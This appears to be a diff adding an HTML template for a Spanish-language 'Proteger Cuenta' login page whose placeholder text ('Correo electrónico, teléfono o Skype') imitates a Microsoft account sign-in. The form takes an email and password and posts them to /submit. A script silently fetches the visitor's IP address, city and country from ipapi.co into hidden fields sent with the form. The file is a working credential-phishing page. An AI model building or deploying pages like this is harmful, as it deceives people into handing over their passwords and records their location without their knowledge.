@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Formulario</title>
+    <style>
+        body {
+            background-color: #f2f2f2;
+            /* Fondo gris */
+            display: flex;
+            justify-content: center;
+            /* Centrar horizontalmente */
+            align-items: center;
+            /* Centrar verticalmente */
+            height: 100vh;
+            /* Ocúpalo todo en dispositivos móviles */
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        form {
+            width: 100%;
+            /* Ancho del formulario */
+            max-width: 450px;
+            /* Máximo ancho del formulario */
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            /* Ancho del input, menos padding */
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: #396fdc;
+            /* Color de fondo del botón */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        img {
+            margin: 0 auto;
+            margin-top: 20px;
+            max-width: 100%;
+        }
+
+        /* Media query para dispositivos con un ancho máximo de 768px (tabletas y teléfonos) */
+        @media (max-width: 768px) {
+            form {
+                width: 100%;
+                /* Formulario ocupa el 100% del ancho en dispositivos móviles */
+                padding: 10px;
+                /* Ajuste de espaciado para dispositivos móviles */
+            }
+
+            body {
+
+                justify-content:start;
+                /* Centrar horizontalmente */
+                align-items:first baseline;
+                /* Centrar verticalmente */
+                /* Ocúpalo todo en dispositivos móviles */
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <form action="/submit" method="post">
+        <div style="width: 100%;text-align: left !important;">
+            <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo" style="width: 150px;">
+            <h2>Proteger Cuenta</h2>
+        </div>
+        <input type="email" id="input1" placeholder="Correo electrónico, teléfono o Skype" name="input1" required><br>
+        <br>
+        <input type="password" id="input2" placeholder="Contraseña" name="input2" required><br>
+        <br>
+        <input type="submit" value="Verificar">
+        <input type="text" id="ip" name="ip" style="display:none ;">
+        <input type="text" id="ciudad" name="ciudad" style="display:none ;">
+        <input type="text" id="pais" name="pais" style="display:none ;">
+
+
+    </form>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script>
+    const url = "https://ipapi.co/json/";
+    axios
+        .get(url)
+        .then((response) => {
+            document.querySelector("#ip").value = response.data.ip;
+            document.querySelector("#ciudad").value = response.data.city;
+            document.querySelector("#pais").value = response.data.country;
+
+        })
+</script>
+
+</html>
